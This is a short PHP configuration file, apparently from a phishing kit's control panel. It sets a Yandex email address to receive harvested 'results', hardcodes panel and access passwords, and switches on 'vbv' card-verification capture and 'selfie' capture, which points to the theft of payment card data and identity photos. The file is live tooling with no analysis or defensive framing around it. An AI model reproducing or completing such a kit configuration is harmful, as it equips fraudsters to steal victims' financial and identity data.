<?php
/* [$$$-------------- Panel Settings --------------$$$] */
$pais_email = 'udahresult@yandex.com';
$pais_userallow = 'false';
$pais_panel = 'zxcasdqwe321';
$pais_minpass = 'zxcasdqwe321';
$pais_multilang = 'lang_active';
$pais_selfie = 'selfie_active';
$pais_vbv = 'vbv_active';
$pais_access = 'zxcasdqwe321';
?>